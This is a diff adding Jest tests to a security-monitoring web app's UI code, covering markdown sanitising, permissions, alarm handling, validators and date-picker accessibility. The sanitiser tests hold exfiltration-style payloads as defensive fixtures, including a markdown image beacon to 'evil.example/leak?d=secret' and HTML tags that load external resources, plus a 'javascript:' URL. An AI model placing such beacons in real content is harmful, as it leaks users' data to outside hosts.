@@ -8,6 +8,14 @@ require('./test_common.js');
 
 const app = global.getApp();
 const _i18n = global.i18n.getLocalizedTranslations('en-US');
+const origAppI18n = app.i18n;
+
+// some tests replace these outright; undo so later tests see the real ones
+afterEach(() => {
+  delete document.getElementById;
+  delete document.querySelector;
+  app.i18n = origAppI18n;
+});
 
 test('escape', () => {
   expect(app.escape('')).toBe('');
@@ -97,6 +105,71 @@ test('wrapScrollableTables', () => {
 
   // Re-processing already-wrapped markup is a no-op.
   expect(app.wrapScrollableTables(wrapped)).toBe(wrapped);
+});
+
+test('formatMarkdown does not load external resources', () => {
+  const html = app.formatMarkdown('![x](https://evil.example/leak?d=secret) [link](https://evil.example/page)');
+  const root = document.createElement('div');
+  root.innerHTML = html;
+
+  expect(root.querySelector('img')).toBeNull();
+  const links = root.querySelectorAll('a');
+  expect(links[0].getAttribute('href')).toBe('https://evil.example/leak?d=secret');
+  expect(links[0].textContent).toBe('External image not loaded: https://evil.example/leak?d=secret');
+  expect(links[1].getAttribute('rel')).toBe('noopener noreferrer');
+  expect(links[1].getAttribute('target')).toBe('_blank');
+
+  expect(app.formatMarkdown('![x](https://evil.example/a)', true)).not.toContain('<img');
+});
+
+test('formatMarkdown loads external images only in authored text the admin allows', () => {
+  const markdown = '![x](https://intranet.example/a.png)';
+  const params = app.parameters;
+  try {
+    app.parameters = { allowExternalMarkdownImages: false };
+    expect(app.formatMarkdown(markdown, false, true)).not.toContain('<img');
+
+    app.parameters = { allowExternalMarkdownImages: true };
+    expect(app.formatMarkdown(markdown, false, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown, true, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown)).not.toContain('<img');
+    expect(app.formatMarkdownMermaid(markdown)).not.toContain('<img');
+  } finally {
+    app.parameters = params;
+  }
+});
+
+test('sanitizeMarkdownHtml', () => {
+  expect(app.sanitizeMarkdownHtml('')).toBe('');
+  expect(app.sanitizeMarkdownHtml(null)).toBe('');
+
+  const blocked = [
+    '<img srcset="https://evil.example/a 1x">',
+    '<div style="background:url(https://evil.example/b)">x</div>',
+    '<video poster="https://evil.example/c" src="https://evil.example/d"></video>',
+    '<audio src="https://evil.example/e"></audio>',
+    '<picture><source srcset="https://evil.example/f"></picture>',
+    '<input type="image" src="https://evil.example/g">',
+    '<table background="https://evil.example/h"><tbody><tr><td>x</td></tr></tbody></table>',
+    '<svg><image href="https://evil.example/i"></image></svg>',
+    '<a href="/x" ping="https://evil.example/j">x</a>',
+    '<img src="https://evil.example:bad">',
+  ];
+  blocked.forEach(html => {
+    const root = document.createElement('div');
+    root.innerHTML = app.sanitizeMarkdownHtml(html);
+    expect(root.querySelector('img[src], video, audio, source, input, svg, [style], [srcset], [background], [poster], [ping]')).toBeNull();
+  });
+
+  const kept = [
+    '<img src="images/logo.svg">',
+    '<img src="data:image/png;base64,AAAA">',
+    '<pre class="mermaid">graph TD\nA</pre>',
+    '<table><thead><tr><th align="center">h</th></tr></thead></table>',
+  ];
+  kept.forEach(html => expect(app.sanitizeMarkdownHtml(html)).toBe(html));
+
+  expect(app.sanitizeMarkdownHtml('<a href="/x">x</a>')).toBe('<a href="/x">x</a>');
 });
 
 test('formatMarkdownSanitizesTables', () => {
@@ -296,6 +369,31 @@ test('isUserAdmin', async () => {
   user.roles.push("superuser");
   expect(app.isUserAdmin(user)).toBe(true);
   expect(app.isUserAdmin()).toBe(true);
+});
+
+test('memory write permissions mirror the built-in roles', () => {
+  const role = (r) => ({ id: '123', roles: [r] });
+  expect(app.canWriteOwnMemories(role('analyst'))).toBe(true);
+  expect(app.canWriteOwnMemories(role('superuser'))).toBe(true);
+  expect(app.canWriteOwnMemories(role('auditor'))).toBe(false);
+  expect(app.canWriteAllMemories(role('superuser'))).toBe(true);
+  expect(app.canWriteAllMemories(role('analyst'))).toBe(false);
+});
+
+test('Onion AI permissions mirror the built-in roles', () => {
+  const role = (r) => ({ id: '123', roles: [r] });
+  for (const r of ['analyst', 'auditor', 'superuser']) {
+    expect(app.canReadOnionAi(role(r))).toBe(true, r);
+  }
+  for (const r of ['limited-analyst', 'limited-auditor']) {
+    expect(app.canReadOnionAi(role(r))).toBe(false, r);
+  }
+  for (const r of ['analyst', 'superuser']) {
+    expect(app.canWriteOnionAi(role(r))).toBe(true, r);
+  }
+  for (const r of ['auditor', 'limited-analyst', 'limited-auditor']) {
+    expect(app.canWriteOnionAi(role(r))).toBe(false, r);
+  }
 });
 
 test('isMyUser', () => {
@@ -944,6 +1042,31 @@ test('isAttentionNeeded', () => {
   expect(app.isAttentionNeeded()).toBe(true);
   app.statusByGridId[''].detections.elastalert.syncFailure = false;
 
+  // Attention when active alarm exists
+  app.statusByGridId['subgrid1'] = {
+    grid: { unhealthyNodeCount: 0 },
+    alerts: { newCount: 0 },
+    detections: {
+      elastalert: {},
+      suricata: {},
+      strelka: {},
+    },
+  };
+  app.alarmStates = [{ alarmId: 'alarm-1', status: 'alarm' }];
+  expect(app.isAlarmActive()).toBe(true);
+  expect(app.isAlarmActive('')).toBe(true);
+  expect(app.isAlarmActive('subgrid1')).toBe(false);
+  expect(app.isGridUnhealthy('')).toBe(true);
+  expect(app.isGridUnhealthy('subgrid1')).toBe(false);
+  expect(app.getSubgridIcon('')).toBe('fa-exclamation');
+  expect(app.getSubgridIcon('subgrid1')).toBe('');
+  expect(app.isUnhealthy()).toBe(true);
+  expect(app.isAttentionNeeded()).toBe(true);
+  app.alarmStates = [{ alarmId: 'alarm-1', status: 'ok' }];
+  expect(app.isAlarmActive()).toBe(false);
+  expect(app.isAlarmActive('')).toBe(false);
+  expect(app.isAlarmActive('subgrid1')).toBe(false);
+
   // Back to normal
   expect(app.isAttentionNeeded()).toBe(false);
 })
@@ -1112,6 +1235,56 @@ test('loadGridInfo', async () => {
   expect(app.gridInfo['g2']).toStrictEqual({foo:2});
 });
 
+test('loadSubgridInfo collects alarm states from subgrids', async () => {
+  const mock = jest.fn((endpoint, options) => {
+    const gridId = options?.params?.gridId;
+    if (endpoint === 'info') {
+      return Promise.resolve({ data: { name: `Info-${gridId}` } });
+    }
+    if (endpoint === 'alarms/states') {
+      if (gridId === 'g1') {
+        return Promise.resolve({ data: [{ alarmId: 'alarm-g1', status: 'alarm' }] });
+      }
+      if (gridId === 'g2') {
+        return Promise.reject(new Error('alarms not supported'));
+      }
+    }
+    return Promise.resolve({ data: {} });
+  });
+  app.papi.get = mock;
+
+  app.gridInfo = {};
+  app.alarmStates = [{ alarmId: 'alarm-local', status: 'ok', gridId: '' }];
+  app.subgrids = [{ id: 'g1' }, { id: 'g2' }];
+
+  await app.loadSubgridInfo();
+
+  expect(app.gridInfo['g1']).toEqual({ name: 'Info-g1' });
+  expect(app.gridInfo['g2']).toEqual({ name: 'Info-g2' });
+  expect(mock).toHaveBeenCalledWith('alarms/states', { params: { gridId: 'g1' } });
+  expect(mock).toHaveBeenCalledWith('alarms/states', { params: { gridId: 'g2' } });
+
+  expect(app.isAlarmActive('g1')).toBe(true);
+  expect(app.isAlarmActive('g2')).toBe(false);
+  expect(app.isAlarmActive('')).toBe(false);
+});
+
+test('setSubgridAlarmStates replaces states for specific grid and keeps other grids intact', () => {
+  app.alarmStates = [
+    { alarmId: 'local-1', status: 'alarm', gridId: '' },
+    { alarmId: 'sub-1', status: 'alarm', gridId: 'subgrid1' },
+  ];
+
+  app.setSubgridAlarmStates('subgrid1', [{ alarmId: 'sub-2', status: 'ok' }]);
+
+  expect(app.alarmStates).toEqual([
+    { alarmId: 'local-1', status: 'alarm', gridId: '' },
+    { alarmId: 'sub-2', status: 'ok', gridId: 'subgrid1' },
+  ]);
+  expect(app.isAlarmActive('subgrid1')).toBe(false);
+  expect(app.isAlarmActive('')).toBe(true);
+});
+
 test('getSelectedGrid', () => {
   app.subgrids = [{id: 'g1', name: 'Grid 1'}, {id: 'g2', name: 'Grid 2'}];
   app.selectedGridId = 'g1';
@@ -1122,6 +1295,31 @@ test('getSelectedGrid', () => {
 
   app.selectedGridId = 'g3';
   expect(app.getSelectedGrid()).toBe(undefined);
+});
+
+test('onGridSelected updates route and reloads notifications when licensed', () => {
+  app.$route = { path: '/alerts', query: {} };
+  app.$router = { push: jest.fn() };
+  app.isLicensed = jest.fn(() => true);
+  app.FEAT_NTF = 'ntf';
+  app.notificationsStarted = true;
+  app.notifications = [{ id: 'main-1' }];
+  app.notificationsTruncated = true;
+  app.unreadCount = 3;
+  app.selectedGridId = 'subgrid-1';
+  app.loadUnreadCount = jest.fn();
+  app.loadNotifications = jest.fn();
+  app.notificationMenu = true;
+
+  app.onGridSelected();
+
+  expect(app.$router.push).toHaveBeenCalledWith({ path: '/alerts', query: { gridId: 'subgrid-1' } });
+  expect(app.notifications).toEqual([]);
+  expect(app.notificationsTruncated).toBe(false);
+  expect(app.unreadCount).toBe(0);
+  expect(app.lastLoadedNotificationGridId).toBe('subgrid-1');
+  expect(app.loadUnreadCount).toHaveBeenCalled();
+  expect(app.loadNotifications).toHaveBeenCalled();
 });
 
 describe('formatActionContent', () => {
@@ -1438,6 +1636,35 @@ graph TD
 \`\`\``;
 
   expect(app.performMermaidRegexes(mermaidWithBothIssues)).toBe(expectedBothFixed);
+
+  expect(app.performMermaidRegexes('a: b\n\n```mermaid\nA: B\n\nC\n```\nc: d\n\n```mermaid\nE:F\n```'))
+    .toBe('a: b\n\n```mermaid\nA∶ B\nC\n```\nc: d\n\n```mermaid\nE∶F\n```');
+  expect(app.performMermaidRegexes('```mermaid\nA: B\n\nC')).toBe('```mermaid\nA: B\n\nC');
+  expect(app.performMermaidRegexes('```js\na: b\n\nc\n```')).toBe('```js\na: b\n\nc\n```');
+
+  const long = 'key: value\n\n'.repeat(20000);
+  expect(app.performMermaidRegexes(long)).toBe(long);
+});
+
+test('formatMarkdownMermaid', () => {
+  const formatMarkdown = jest.spyOn(app, 'formatMarkdown').mockImplementation(text => '<p>' + text + '</p>');
+  const renderMermaid = jest.spyOn(app, 'renderMermaid').mockImplementation(() => {});
+
+  expect(app.formatMarkdownMermaid('```mermaid\nA[Start: Begin]\n```')).toBe('<p>```mermaid\nA[Start∶ Begin]\n```</p>');
+  expect(formatMarkdown).toHaveBeenCalledWith('```mermaid\nA[Start∶ Begin]\n```', true, false);
+  expect(renderMermaid).toHaveBeenCalledTimes(1);
+
+  app.formatMarkdownMermaid('streaming', false);
+  expect(renderMermaid).toHaveBeenCalledTimes(1);
+
+  app.formatMarkdownMermaid('```mermaid\nAlice->>Bob: Hello\n```', true, true);
+  expect(formatMarkdown).toHaveBeenLastCalledWith('```mermaid\nAlice->>Bob: Hello\n```', true, true);
+
+  expect(app.formatMarkdownMermaid('')).toBe('');
+  expect(app.formatMarkdownMermaid(null)).toBe('');
+
+  formatMarkdown.mockRestore();
+  renderMermaid.mockRestore();
 });
 
 test('verifyRuleSyntax - implementation', () => {
@@ -1484,6 +1711,26 @@ test('verifyRuleSyntax - implementation', () => {
   app.ruleValidators = _old;
 });
 
+test('yaraContentForSyntaxCheck skips securityonion-yara preambles', () => {
+  expect(app.yaraContentForSyntaxCheck('rule X { condition: true }')).toBe('rule X { condition: true }');
+  expect(app.yaraContentForSyntaxCheck('\n\n  rule X { condition: true }').startsWith('rule X')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('import "pe"\nrule X { condition: true }').startsWith('rule X')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('import "pe" /* c */\r\nimport "math" // c\r\nrule X { condition: true }')).toBe('rule X { condition: true }');
+  expect(app.yaraContentForSyntaxCheck('import "pe"\r\nrule X { condition: true }')).toBe('rule X { condition: true }');
+  expect(app.yaraContentForSyntaxCheck('import "pe"\r\n\r\nprivate  rule X { condition: true }')).toBe('rule X { condition: true }');
+  expect(app.yaraContentForSyntaxCheck('/* rule NotTheRule */\nrule X { condition: true }')).toBe('rule X { condition: true }');
+  expect(app.yaraContentForSyntaxCheck('// c\nrule X { condition: true }').startsWith('rule X')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('/* Rule Set */\nrule X { condition: true }').startsWith('rule X')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('private rule X { condition: true }').startsWith('rule X')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('private\trule X { condition: true }').startsWith('private')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('global rule X { condition: true }').startsWith('global')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('include "x.yar"\nrule X { condition: true }').startsWith('include')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('import \'pe\'\nrule X { condition: true }').startsWith('import')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('import "pe"rule X { condition: true }').startsWith('import')).toBe(true);
+  expect(app.yaraContentForSyntaxCheck('/* no end')).toBe('');
+  expect(app.yaraContentForSyntaxCheck('')).toBe('');
+});
+
 test('validator: required', () => {
   const v = app.validators.required;
   expect(v('')).toBe(_i18n.required);
@@ -1494,6 +1741,42 @@ test('validator: required', () => {
   expect(v('a')).toBe(true);
   expect(v('hello')).toBe(true);
   expect(v(1)).toBe(true);
+});
+
+test('validator: email', () => {
+  const v = app.validators.email;
+  expect(v('')).toBe(true);
+  expect(v(null)).toBe(true);
+  expect(v(undefined)).toBe(true);
+  expect(v('x@x.x')).toBe(true);
+  expect(v('user@example.com')).toBe(true);
+  expect(v('Something <x@x.x>')).toBe(true);
+  expect(v('Security Onion <alerts@example.com>')).toBe(true);
+  expect(v('"Security Onion" <alerts@example.com>')).toBe(true);
+  expect(v('  x@x.x  ')).toBe(true);
+  expect(v('invalid')).toBe(_i18n.invalidEmail);
+  expect(v('no-at-sign.com')).toBe(_i18n.invalidEmail);
+  expect(v('user@domain')).toBe(_i18n.invalidEmail);
+  expect(v('@domain.com')).toBe(_i18n.invalidEmail);
+  expect(v('user@domain.')).toBe(_i18n.invalidEmail);
+  expect(v('Something user@example.com')).toBe(_i18n.invalidEmail);
+  expect(v('Something <user@domain>')).toBe(_i18n.invalidEmail);
+});
+
+test('validator: url', () => {
+  const v = app.validators.url;
+  expect(v('')).toBe(true);
+  expect(v(null)).toBe(true);
+  expect(v(undefined)).toBe(true);
+  expect(v('https://hooks.slack.com/services/xxx')).toBe(true);
+  expect(v('http://localhost:8080/hook')).toBe(true);
+  expect(v('https://matrix.example.com/_matrix/hookshot/123')).toBe(true);
+  expect(v('http://192.168.1.100/webhook')).toBe(true);
+  expect(v('ftp://example.com')).toBe(_i18n.invalidUrl);
+  expect(v('not-a-url')).toBe(_i18n.invalidUrl);
+  expect(v('http://')).toBe(_i18n.invalidUrl);
+  expect(v('https://')).toBe(_i18n.invalidUrl);
+  expect(v('javascript:alert(1)')).toBe(_i18n.invalidUrl);
 });
 
 test('validator: number', () => {
@@ -1638,6 +1921,29 @@ test('validator: maxLength factory', () => {
   expect(v5('abcdef')).toBe(_i18n.ruleMaxLen);
 });
 
+test('validator: minValue factory', () => {
+  const v0 = app.validators.minValue(0);
+  const message = _i18n.ruleMinValue.replace('{limit}', 0);
+  expect(v0(0)).toBe(true);
+  expect(v0(0.5)).toBe(true);
+  expect(v0('3')).toBe(true);
+  expect(v0(-1)).toBe(message);
+  expect(v0('')).toBe(message);
+  expect(v0(null)).toBe(message);
+  expect(v0('abc')).toBe(message);
+});
+
+test('validator: maxValue factory', () => {
+  const v1 = app.validators.maxValue(1);
+  const message = _i18n.ruleMaxValue.replace('{limit}', 1);
+  expect(v1(1)).toBe(true);
+  expect(v1(0.25)).toBe(true);
+  expect(v1(1.5)).toBe(message);
+  expect(v1('')).toBe(message);
+  expect(v1(null)).toBe(message);
+  expect(v1('abc')).toBe(message);
+});
+
 test('validator: fileSizeLimit factory', () => {
   const formatFn = (n) => n + ' bytes';
   const v = app.validators.fileSizeLimit(1000, formatFn);
@@ -1742,4 +2048,326 @@ test('a live agentic push is not republished again by the next settings reload',
   await app.loadServerSettings();
 
   expect(handler).not.toHaveBeenCalled();
+});
+
+test('parseMultiDocYaml', () => {
+  expect(app.parseMultiDocYaml('---\nid: a\nlevel: 3\n---\n---\nname: b\n')).toEqual([{ id: 'a', level: '3' }, { name: 'b' }]);
+  expect(app.parseMultiDocYaml('')).toEqual([]);
+  expect(app.parseMultiDocYaml('id: a\n---\n')).toEqual([{ id: 'a' }]);
+});
+
+test('loadAlarmStates populates alarmStates and marks alarmStatesLoaded even without notification license', async () => {
+  app.username = 'test@example.com';
+  app.isLicensed = jest.fn(() => false);
+  app.alarmStates = [];
+  app.alarmStatesLoaded = false;
+
+  resetPapi();
+  const mockStates = [{ alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' }];
+  app.papi.get = jest.fn().mockResolvedValue({ data: mockStates });
+
+  await app.loadAlarmStates();
+
+  expect(app.papi.get).toHaveBeenCalledWith('alarms/states', { params: { gridId: '' } });
+  expect(app.alarmStates).toEqual([{ alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm', gridId: '' }]);
+  expect(app.alarmStatesLoaded).toBe(true);
+});
+
+test('loadServerSettings fetches alarm states on initial load and skips subsequent loads when already loaded', async () => {
+  app.username = 'test@example.com';
+  app.alarmStatesLoaded = false;
+  const originalLoadAlarmStates = app.loadAlarmStates;
+  app.loadAlarmStates = jest.fn().mockImplementation(() => {
+    app.alarmStatesLoaded = true;
+    return Promise.resolve();
+  });
+
+  const fakeInfo = {
+    userId: 'user-1',
+    notificationsStarted: false,
+    parameters: {},
+  };
+
+  stubServerSettings({});
+  app.papi.get = jest.fn().mockResolvedValue({ data: fakeInfo });
+
+  // First call: alarm states not yet loaded
+  await app.loadServerSettings();
+  expect(app.loadAlarmStates).toHaveBeenCalledTimes(1);
+
+  // Second call: alarm states already loaded, should NOT fetch again
+  app.loadServerSettingsTime = 0;
+  await app.loadServerSettings();
+  expect(app.loadAlarmStates).toHaveBeenCalledTimes(1);
+
+  app.loadAlarmStates = originalLoadAlarmStates;
+});
+
+test('openWebsocket onopen reloads alarm states to reconcile state on reconnect', () => {
+  app.loadAlarmStates = jest.fn();
+  app.updateStatus = jest.fn();
+  app.wsUrl = 'ws://localhost/ws';
+  app.socket = null;
+
+  global.WebSocket = jest.fn().mockImplementation(() => {
+    return {
+      readyState: 0,
+      onopen: null,
+      onclose: null,
+      onmessage: null,
+      onerror: null,
+    };
+  });
+
+  app.openWebsocket();
+  expect(app.socket).not.toBeNull();
+  expect(typeof app.socket.onopen).toBe('function');
+
+  app.socket.onopen({});
+
+  expect(app.loadAlarmStates).toHaveBeenCalled();
+  expect(app.connected).toBe(true);
+});
+
+test('onAlarmDelete removes matching alarm states and updates UI indicators', () => {
+  app.updateStatus = jest.fn();
+  app.setFavicon = jest.fn();
+  app.updateTitle = jest.fn();
+
+  app.alarmStates = [
+    { alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' },
+    { alarmId: 'alarm-2', nodeId: 'node-2', status: 'alarm' },
+  ];
+
+  expect(app.isAlarmActive()).toBe(true);
+
+  // Delete alarm-1 via object payload
+  app.onAlarmDelete({ alarmId: 'alarm-1' });
+
+  expect(app.alarmStates).toEqual([
+    { alarmId: 'alarm-2', nodeId: 'node-2', status: 'alarm' },
+  ]);
+  expect(app.updateStatus).toHaveBeenCalledTimes(1);
+  expect(app.setFavicon).toHaveBeenCalledTimes(1);
+  expect(app.updateTitle).toHaveBeenCalledTimes(1);
+  expect(app.isAlarmActive()).toBe(true);
+
+  // Delete alarm-2 via string payload
+  app.onAlarmDelete('alarm-2');
+
+  expect(app.alarmStates).toEqual([]);
+  expect(app.updateStatus).toHaveBeenCalledTimes(2);
+  expect(app.setFavicon).toHaveBeenCalledTimes(2);
+  expect(app.updateTitle).toHaveBeenCalledTimes(2);
+  expect(app.isAlarmActive()).toBe(false);
+});
+
+test('onAlarmDelete handles missing/non-matching payloads gracefully', () => {
+  app.updateStatus = jest.fn();
+  app.setFavicon = jest.fn();
+  app.updateTitle = jest.fn();
+
+  app.alarmStates = [
+    { alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' },
+  ];
+
+  app.onAlarmDelete(null);
+  app.onAlarmDelete({});
+  app.onAlarmDelete('');
+  app.onAlarmDelete({ alarmId: 'alarm-nonexistent' });
+
+  expect(app.alarmStates).toHaveLength(1);
+  expect(app.updateStatus).not.toHaveBeenCalled();
+});
+
+test('onAlarmDelete scopes deletion by gridId when specified', () => {
+  app.updateStatus = jest.fn();
+  app.setFavicon = jest.fn();
+  app.updateTitle = jest.fn();
+
+  app.alarmStates = [
+    { alarmId: 'shared-alarm', nodeId: 'node-1', status: 'alarm', gridId: '' },
+    { alarmId: 'shared-alarm', nodeId: 'node-2', status: 'alarm', gridId: 'subgrid1' },
+  ];
+
+  // Deleting for local grid should only delete local alarm
+  app.onAlarmDelete({ alarmId: 'shared-alarm', gridId: '' });
+
+  expect(app.alarmStates).toEqual([
+    { alarmId: 'shared-alarm', nodeId: 'node-2', status: 'alarm', gridId: 'subgrid1' },
+  ]);
+
+  // Deleting for subgrid1 should delete subgrid1 alarm
+  app.onAlarmDelete({ alarmId: 'shared-alarm', gridId: 'subgrid1' });
+  expect(app.alarmStates).toEqual([]);
+});
+
+describe('applyDateRangePickerA11y', () => {
+  const jq = require('./external/jquery-4.0.0.min.js');
+  let original$, origRects, picker, $input, $c;
+
+  const pressKey = (el, key, opts = {}) => {
+    const e = jq.Event('keydown', { key, ...opts });
+    jq(el).trigger(e);
+    return e;
+  };
+
+  beforeEach(() => {
+    original$ = global.$;
+    global.$ = jq;
+    // jsdom has no layout, so treat everything outside .hidden as visible
+    origRects = Element.prototype.getClientRects;
+    Element.prototype.getClientRects = function() { return this.closest('.hidden') ? [] : [{}]; };
+
+    document.body.innerHTML = `
+      <input id="before"><input id="dr"><button id="after">after</button>
+      <div class="daterangepicker">
+        <div class="ranges"><ul><li data-range-key="Today">Today</li><li data-range-key="Custom">Custom</li></ul></div>
+        <div class="drp-calendar left"><div class="calendar-time"><select class="hourselect"></select><select class="minuteselect"></select></div></div>
+        <div class="drp-calendar right"><div class="calendar-time"><select class="hourselect"></select></div></div>
+        <div class="drp-buttons"><button class="cancelBtn">Cancel</button><button class="applyBtn">Apply</button></div>
+      </div>`;
+    $input = jq('#dr');
+    $c = jq('.daterangepicker');
+    picker = {
+      container: $c,
+      element: $input,
+      isShowing: true,
+      show: jest.fn(function() { this.isShowing = true; }),
+      hide: jest.fn(function() { this.isShowing = false; }),
+      keydown: jest.fn(),
+    };
+
+    $input.on('focus.daterangepicker', jq.proxy(picker.show, picker));
+    $input.on('keydown.daterangepicker', jq.proxy(picker.keydown, picker));
+    $c.find('.ranges').on('click.daterangepicker', 'li', e => {
+      if (e.currentTarget.dataset.rangeKey !== 'Custom') picker.hide();
+    });
+    $c.find('.drp-calendar.left').on('change.daterangepicker', 'select', () => {
+      $c.find('.drp-calendar.left .calendar-time').html('<select class="hourselect"></select><select class="minuteselect"></select>');
+    });
+
+    app.applyDateRangePickerA11y(picker);
+    picker.show.mockClear();
+  });
+
+  afterEach(() => {
+    global.$ = original$;
+    Element.prototype.getClientRects = origRects;
+    document.body.innerHTML = '';
+  });
+
+  test('should label time selects and make presets focusable buttons', () => {
+    expect(_i18n.ariaPickerStartHour).toBeTruthy();
+    expect($c.find('.drp-calendar.left .hourselect').attr('aria-label')).toBe(_i18n.ariaPickerStartHour);
+    expect($c.find('.drp-calendar.right .hourselect').attr('aria-label')).toBe(_i18n.ariaPickerEndHour);
+    expect($c.find('.ranges ul').attr('role')).toBe('none');
+    $c.find('.ranges li').each((_, li) => {
+      expect(li.getAttribute('tabindex')).toBe('0');
+      expect(li.getAttribute('role')).toBe('button');
+    });
+  });
+
+  test('should move focus into the picker on Tab from the input instead of closing it', () => {
+    $input.trigger('focus');
+    const e = pressKey($input, 'Tab');
+    expect(e.isDefaultPrevented()).toBe(true);
+    expect(document.activeElement).toBe($c.find('.ranges li')[0]);
+    expect(picker.keydown).not.toHaveBeenCalled();
+  });
+
+  test('should pass other input keys, and Tab while hidden, to the library', () => {
+    pressKey($input, 'Escape');
+    expect(picker.keydown).toHaveBeenCalledTimes(1);
+
+    picker.isShowing = false;
+    const e = pressKey($input, 'Tab');
+    expect(e.isDefaultPrevented()).toBe(false);
+    expect(picker.keydown).toHaveBeenCalledTimes(2);
+  });
+
+  test('should select a preset on Enter or Space and return focus without reopening', () => {
+    const today = $c.find('.ranges li')[0];
+    today.focus();
+    expect(pressKey(today, 'Enter').isDefaultPrevented()).toBe(true);
+    expect(picker.hide).toHaveBeenCalledTimes(1);
+    expect(document.activeElement).toBe($input[0]);
+    expect(picker.show).not.toHaveBeenCalled();
+
+    picker.isShowing = true;
+    today.focus();
+    pressKey(today, ' ');
+    expect(picker.hide).toHaveBeenCalledTimes(2);
+  });
+
+  test('should keep the picker open and focus in place for the Custom preset', () => {
+    const custom = $c.find('.ranges li')[1];
+    custom.focus();
+    pressKey(custom, 'Enter');
+    expect(picker.hide).not.toHaveBeenCalled();
+    expect(document.activeElement).toBe(custom);
+  });
+
+  test('should close the picker on Escape and return focus to the input', () => {
+    const select = $c.find('select')[0];
+    select.focus();
+    expect(pressKey(select, 'Escape').isDefaultPrevented()).toBe(true);
+    expect(picker.hide).toHaveBeenCalled();
+    expect(document.activeElement).toBe($input[0]);
+    expect(picker.show).not.toHaveBeenCalled();
+  });
+
+  test('should return to the input on Shift+Tab from the first item with the picker open', () => {
+    const first = $c.find('.ranges li')[0];
+    first.focus();
+    expect(pressKey(first, 'Tab', { shiftKey: true }).isDefaultPrevented()).toBe(true);
+    expect(document.activeElement).toBe($input[0]);
+    expect(picker.hide).not.toHaveBeenCalled();
+  });
+
+  test('should close the picker on Tab from the last item and move past the input', () => {
+    const apply = $c.find('.applyBtn')[0];
+    apply.focus();
+    expect(pressKey(apply, 'Tab').isDefaultPrevented()).toBe(true);
+    expect(picker.hide).toHaveBeenCalled();
+    expect(document.activeElement).toBe(document.getElementById('after'));
+  });
+
+  test('should leave Tab between middle items to the browser', () => {
+    const select = $c.find('select')[0];
+    select.focus();
+    expect(pressKey(select, 'Tab').isDefaultPrevented()).toBe(false);
+    expect(pressKey(select, 'Tab', { shiftKey: true }).isDefaultPrevented()).toBe(false);
+  });
+
+  test('should skip hidden elements when finding the last item', () => {
+    $c.find('.drp-buttons').addClass('hidden');
+    const lastSelect = $c.find('.drp-calendar.right select')[0];
+    lastSelect.focus();
+    pressKey(lastSelect, 'Tab');
+    expect(picker.hide).toHaveBeenCalled();
+  });
+
+  test('should keep time select focus and label after the library re-renders it', () => {
+    const minute = $c.find('.drp-calendar.left .minuteselect')[0];
+    minute.focus();
+    jq(minute).trigger('change');
+
+    const rerendered = $c.find('.drp-calendar.left .minuteselect')[0];
+    expect(rerendered).not.toBe(minute);
+    expect(document.activeElement).toBe(rerendered);
+    expect(rerendered.getAttribute('aria-label')).toBe(_i18n.ariaPickerStartMinute);
+  });
+
+  test('should not stack handlers when re-applied on each show', () => {
+    app.applyDateRangePickerA11y(picker);
+    app.applyDateRangePickerA11y(picker);
+    pressKey($input, 'Escape');
+    expect(picker.keydown).toHaveBeenCalledTimes(1);
+
+    const today = $c.find('.ranges li')[0];
+    today.focus();
+    pressKey(today, 'Enter');
+    expect(picker.hide).toHaveBeenCalledTimes(1);
+  });
 });
